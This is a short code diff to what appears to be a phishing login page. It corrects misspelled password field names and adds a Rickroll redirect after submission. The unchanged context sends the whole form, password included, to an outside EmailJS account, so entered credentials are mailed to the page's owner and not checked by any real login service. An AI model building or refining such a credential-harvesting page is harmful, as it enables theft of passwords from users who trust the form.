@@ -23,12 +23,12 @@
                 </div>
                 
                 <div class="form-group">
-                    <input type="passwrd" name="P" id="passwrd" required>
-                    <label for="passwrd">Password</label>
+                    <input type="password" name="P" id="password" required>
+                    <label for="password">Password</label>
                 </div>
                 
-                <div class="forgot-passwrd">
-                    <a href="#">Forgot passwrd?</a>
+                <div class="forgot-password">
+                    <a href="#">Forgot password?</a>
                 </div>
                 
                 <div class="form-footer">
@@ -51,7 +51,8 @@
 
     emailjs.sendForm("xtrawalo", "template_to3qevh", this)
       .then(function(response) {
-        // No message shown
+        // Redirect after form is successfully submitted
+        window.location.href = "https://youtu.be/dQw4w9WgXcQ";  // Rickroll URL
       }, function(error) {
         console.error("Failed to send:", error);
       });
